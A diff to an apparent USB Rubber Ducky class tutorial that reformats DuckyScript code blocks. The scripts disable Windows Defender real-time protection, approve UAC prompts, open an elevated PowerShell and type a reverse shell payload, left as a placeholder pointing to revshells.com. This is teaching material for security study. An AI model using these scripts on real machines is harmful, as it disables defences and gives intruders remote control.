@@ -16,7 +16,7 @@
 
 This is what a basic reverse shell looks like.
 
-~~~
+```duckyscript
 REM Title:My Basic Reverse shell
 REM Author: Ray
 REM Description:Opens an reverse shell with powershell
@@ -30,11 +30,11 @@ DELAY 300
 REM ^^^ Delay for 300 milliseconds
 STRINGLN powershell -c <RevShell payload>
 REM ^^^ Enter payload
-~~~
+```
 
 ## Note:
 
-You will have to replace "**\<RevShell payload\>**" with one from
+You will have to replace `<RevShell payload>` with one from
 https://www.revshells.com/. In this case the class will use the PowerShell #1
 payload. (Don't forget to change the IP address to the listener. (kali computer))
 
@@ -75,41 +75,41 @@ Extension in ducky script is just a fast way to import something in the Payload 
 
 > To learn more about Extension https://docs.hak5.org/hak5-usb-rubber-ducky/advanced-features/extensions
 
-~~~
+```duckyscript
 EXTENSION DETECT_READY
-    REM VERSION 1.1
-    REM AUTHOR: Korben
+ REM VERSION 1.1
+ REM AUTHOR: Korben
 
-    REM_BLOCK DOCUMENTATION
-        USAGE:
-            Extension runs inline (here)
-            Place at beginning of payload (besides ATTACKMODE) to act as dynamic
-            boot delay
+ REM_BLOCK DOCUMENTATION
+ USAGE:
+ Extension runs inline (here)
+ Place at beginning of payload (besides ATTACKMODE) to act as dynamic
+ boot delay
 
-        TARGETS:
-            Any system that reflects CAPSLOCK will detect minimum required delay
-            Any system that does not reflect CAPSLOCK will hit the max delay of 3000ms
-    END_REM
+ TARGETS:
+ Any system that reflects CAPSLOCK will detect minimum required delay
+ Any system that does not reflect CAPSLOCK will hit the max delay of 3000ms
+ END_REM
 
-    REM CONFIGURATION:
-    DEFINE #RESPONSE_DELAY 25
-    DEFINE #ITERATION_LIMIT 120
+ REM CONFIGURATION:
+ DEFINE #RESPONSE_DELAY 25
+ DEFINE #ITERATION_LIMIT 120
 
-    VAR $C = 0
-    WHILE (($_CAPSLOCK_ON == FALSE) && ($C < #ITERATION_LIMIT))
-        CAPSLOCK
-        DELAY #RESPONSE_DELAY
-        $C = ($C + 1)
-    END_WHILE
-    CAPSLOCK
+ VAR $C = 0
+ WHILE (($_CAPSLOCK_ON == FALSE) && ($C < #ITERATION_LIMIT))
+ CAPSLOCK
+ DELAY #RESPONSE_DELAY
+ $C = ($C + 1)
+ END_WHILE
+ CAPSLOCK
 END_EXTENSION
-~~~
+```
 
 This extension will automatically launch the payload when the computer is ready.
 
 ## Navigate GUI to disable windows Defender settings
 
-~~~
+```duckyscript
 REM Open Windows Defender Settings
 CTRL ESC
 DELAY 750
@@ -118,14 +118,14 @@ DELAY 250
 ENTER
 DELAY 1000
 ENTER
-~~~
+```
 
-1. Ctrl Esc is a keyboard shortcut for windows start menu. To learn more about Microsoft keyboard shortcut:  https://support.microsoft.com/en-us/windows/keyboard-shortcuts-in-windows-dcc61a57-8ff0-cffe-9796-cb9706c75eec\
+1. `Ctrl + Esc` is a keyboard shortcut for windows start menu. To learn more about Microsoft keyboard shortcut: https://support.microsoft.com/en-us/windows/keyboard-shortcuts-in-windows-dcc61a57-8ff0-cffe-9796-cb9706c75eec\
 2. Type out windows security.
 3. Press Enter to open the windows security.
-4.  Press Enter again to go from home to Virus & threat protection.
+4. Press Enter again to go from home to Virus & threat protection.
 
-~~~
+```duckyscript
 REM Navigate to Manage Settings
 DELAY 500
 TAB
@@ -138,39 +138,39 @@ TAB
 DELAY 100
 ENTER
 DELAY 500
-~~~
+```
 
-> You can navigate most GUI with tab key to move forward and Shift + tab to go back.
+> You can navigate most GUI with tab key to move forward and `Shift + tab` to go back.
 
 So, this part will move from the Quick Scan button to manage settings under right under virus & threat protection settings and Enter the manage settings button.
 
 ![](../Assets/Advance_ducky/Screenshot_2024-02-06_125337.png)
 
-~~~
+```duckyscript
 REM Open and turn off Realtime Protection
 SPACE
 DELAY 1000
 ALT y
 DELAY 1000
-~~~
+```
 
 This part will hit the space bar to toggle the on/off setting.
 
 ![](../Assets/Advance_ducky/Screenshot_2024-02-06_125356_600x191.png)
 
-When this happens, the UAC will active and ask for yes or no. ALT + y will hit the yes button.
+When this happens, the UAC will active and ask for yes or no. `ALT + y` will hit the yes button.
 
 ![](../Assets/Advance_ducky/Screenshot_2024-02-06_125409_500x412.png)
 
-~~~
+```duckyscript
 REM Exit security settings
 ALT F4
 DELAY 500
-~~~
+```
 
 This will just close the Windows security tab.
 
-~~~
+```duckyscript
 REM Open elevated PowerShell
 GUI r
 DELAY 500
@@ -179,24 +179,25 @@ CTRL-SHIFT ENTER
 DELAY 1000
 ALT y
 DELAY 1000
-~~~
+```
 
 1. Opens a run prompt.
 2. Types out PowerShell
-3.  Ctrl + shift + Enter when in the run prompt will open as admin
+3. `Ctrl + shift + Enter` when in the run prompt will open as admin
 4. hit yes in the UAC to launch PowerShell.
 
-~~~
-REM Enter reverse shell and hides the terrminal
-STRINGLN <ReveShell payload>
+```duckyscript
+REM Enter reverse shell and hides the terminal
+STRINGLN <RevShell payload>
 DELAY 200
 GUI DOWNARROW
-~~~
-> Note: don't forget to change the "\<ReveShell Payload\>" to the PowerShell #1 from the ReveShell Site (don't forget about the IP).
+```
+
+> Note: don't forget to change the `<RevShell Payload>` to the PowerShell #1 from the RevShell Site (don't forget about the IP).
 
 # Generate and putting it on the ducky.
 
-[Intro ducky class](/../main/Rubber-Ducky-Intro/README.md#generate-payload-and-getting-it-on-the-ducky)
+[Intro ducky class](../Rubber-Ducky-Intro/README.md#generate-payload-and-getting-it-on-the-ducky)
 
 # Notes
 
